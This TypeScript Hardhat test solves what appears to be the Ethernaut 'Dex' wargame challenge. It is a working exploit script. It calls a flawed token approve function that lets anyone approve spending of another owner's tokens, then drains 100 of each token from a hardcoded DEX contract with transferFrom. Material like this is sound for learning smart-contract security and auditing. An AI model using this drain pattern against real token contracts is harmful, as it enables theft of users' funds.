import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";
import { expect } from "chai";

describe("dex", function() {
    it("should solve dex challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);


        /*
         * The challenge says:
         * You will start with 10 tokens of token1 and 10 of token2. 
         * The DEX contract starts with 100 of each token.
         */

        // deploy both tokens with an initial supply of 110
        /*
        const swappableFactory = await ethers.getContractFactory("SwappableToken");
        const token1 = await swappableFactory.deploy("token1", "tk1", 110);
        const token2 = await swappableFactory.deploy("token2", "tk2", 110);
        await eoa.provider!.waitForTransaction(token1.deployTransaction.hash);
        await eoa.provider!.waitForTransaction(token2.deployTransaction.hash);

        // deploy dex factory with token1 and token2 address. 
        const dexFactory = await ethers.getContractFactory("Dex");
        const dex = await dexFactory.deploy(token1.address, token2.address);
        await eoa.provider!.waitForTransaction(dex.deployTransaction.hash);
        
        // Check initial balances
        balance = await dex.balanceOf(token1.address, eoa.address);
        console.log("Owner token1: " + balance);
        expect(balance).to.eq(110);

        balance = await dex.balanceOf(token2.address, eoa.address);
        console.log("Owner token2: " + balance);
        expect(balance).to.eq(110);

        // distribute tokens as challenge suggested
        let tx = await token1.transfer(dex.address, 100);
        await tx.wait();
        console.log(tx);

        tx = await token2.transfer(dex.address, 100);
        await tx.wait();
        console.log(tx);

        const attackerEoa = accounts[1];
        tx = await token1.transfer(attackerEoa.address, 10);
        await tx.wait();
        console.log(tx);

        tx = await token2.transfer(attackerEoa.address, 10);
        await tx.wait();
        console.log(tx);

        // check balances after distribution
        balance = await dex.balanceOf(token1.address, dex.address);
        console.log("Dex token1: " + balance);
        expect(balance).to.eq(100);

        balance = await dex.balanceOf(token2.address, dex.address);
        console.log("Dex token2: " + balance);
        expect(balance).to.eq(100);

        balance = await dex.balanceOf(token1.address, attackerEoa.address);
        console.log("Attacker token1: " + balance);
        expect(balance).to.eq(10);

        balance = await dex.balanceOf(token2.address, attackerEoa.address);
        console.log("Attacker token2: " + balance);
        expect(balance).to.eq(10);
        */

        // attack starts here
        const dexABI = [
            "function token1() public view returns (address)",
            "function token2() public view returns (address)",
            "function balanceOf(address, address) public view returns (uint)",
        ];

        let dexAddr = "0xD3Ab8a62c50F725BB8bf7C416C683f5Ee490D619";
        let dexCont = new ethers.Contract(dexAddr, dexABI, ethers.getDefaultProvider());
        dexCont = dexCont.connect(eoa);

        const token1Addr = await dexCont.token1();
        await attackBody(token1Addr, dexCont, eoa);

        const token2Addr = await dexCont.token2();
        await attackBody(token2Addr, dexCont, eoa);
   });
});


async function attackBody(tokenAddr: string, dexCont: Contract, eoa: Signer) {
        const tokenABI = [
            "function approve(address owner, address spender, uint amount) public returns(bool)",
            "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)",
        ];

        let tokenCont = new ethers.Contract(tokenAddr, tokenABI, ethers.getDefaultProvider());
        tokenCont = tokenCont.connect(eoa);

        const eoaAddr = await eoa.getAddress();

        /*
         * SwappableToken overrides ERC20 approve method in a way that
         * you can approve token's of any owner(address)
         */

        let tx = await tokenCont.approve(dexCont.address, eoaAddr, 100);
        await tx.wait();
        console.log(tx);

        tx = await tokenCont.transferFrom(dexCont.address, eoaAddr, 100);
        await tx.wait();
        console.log(tx);

        let balance = await dexCont.balanceOf(tokenAddr, eoaAddr);
        console.log("Attacker token: " + balance);
        expect(balance).to.eq(110);
} 